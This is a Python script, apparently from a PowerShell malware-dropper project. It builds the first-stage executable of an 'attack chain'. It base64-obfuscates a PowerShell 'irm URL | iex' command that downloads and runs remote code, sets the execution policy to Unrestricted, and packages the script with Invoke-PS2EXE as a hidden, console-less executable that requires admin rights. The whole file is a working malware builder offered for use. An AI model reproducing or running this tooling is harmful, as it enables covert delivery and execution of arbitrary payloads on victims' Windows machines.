import sys, os, ctypes
import subprocess
import json
from termcolor import colored
import base64

def base64_encode_ps_cmd(encoded_dropper_url):
    data = bytes('''Set-ExecutionPolicy Unrestricted
$cmd = "irm '''+ encoded_dropper_url +''' | iex"
Invoke-Expression $cmd
    ''', 'utf-8')
    encoded_data = base64.b64encode(data)
    return encoded_data.decode("utf-8") 
   
def create_ps1_file(encoded_dropper_url):
    file_contents = '''function db64 { [CmdletBinding()] param([Parameter(Mandatory=$true)] [string]$EncodedString) [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncodedString))}
$enc_text = \"'''+ base64_encode_ps_cmd(encoded_dropper_url) +'''\" 
$decodedText = db64 $enc_text
$lines = $decodedText -split "`n"
foreach($line in $lines) {Invoke-Expression $line}
'''
    #https://raw.githubusercontent.com/RaviNayyar/ps_malware_dropper/main/dropper/enc_drop.ps1
    f = open("init_file.ps1", "w")
    f.write(file_contents)
    f.close()



def cmdlet_exists(cmdlet_name):
    cmd = ['powershell.exe', f'-Command', f'Get-Command {cmdlet_name}']
    try:
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError:
        return False
    return True


def setup():
    os.system("powershell.exe Set-ExecutionPolicy Unrestricted")

    # Test if the Get-Service cmdlet exists
    if cmdlet_exists('Get-Service'):
        print('Get-Service cmdlet exists')
    else:
        print('Get-Service cmdlet does not exist')

    # Test if the nonexistent cmdlet exists
    if cmdlet_exists('Invoke-PS2EXE '):
        print('Invoke-PS2EXE  cmdlet exists')
        return True
    else:
        print('Installing Invoke-PS2EXE cmdlet')
        os.system("powershell.exe Install-Module ps2exe")
        if cmdlet_exists('Invoke-PS2EXE '):
            print('Invoke-PS2EXE  cmdlet exists')
            return True
    
    return False


def parse_config_file(config_path):
    f = open(config_path)
    data = json.load(f)
    ac = data["attack chain"]
    encoded_dropper_url = ac["init_exe"]["encoded_dropper_url"]
    init_exe_filename = ac["init_exe"]["init_exe_filename"]
    return (encoded_dropper_url, init_exe_filename)


def usage_details():
    print("Usage Example 1: python3 create_init_exe.py <attack chain config path>\n")

def isAdmin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

if __name__ == '__main__':
    if not  isAdmin():
        print(colored('ERROR: Please run as admin', 'red'))
        sys.exit()

    if len(sys.argv) != 2:
        print("CMD Line Args Error")
        usage_details()
        sys.exit()
    
    if not os.path.exists(sys.argv[1]):
        print("Attack Chain Config File Path Not Found")
        usage_details()
    
    (encoded_dropper_url, init_exe_filename) = parse_config_file(sys.argv[1])

    create_ps1_file(encoded_dropper_url)

    if not setup():
        print("Unable to create EXE from ps1 file")
        sys.exit()
    
    if init_exe_filename[:-4] != ".exe":
        init_exe_filename += ".exe"

    os.system(f"powershell.exe  Invoke-PS2EXE -inputFile init_file.ps1 -outputFile {init_exe_filename} -requireAdmin -noConsole -noOutput")
    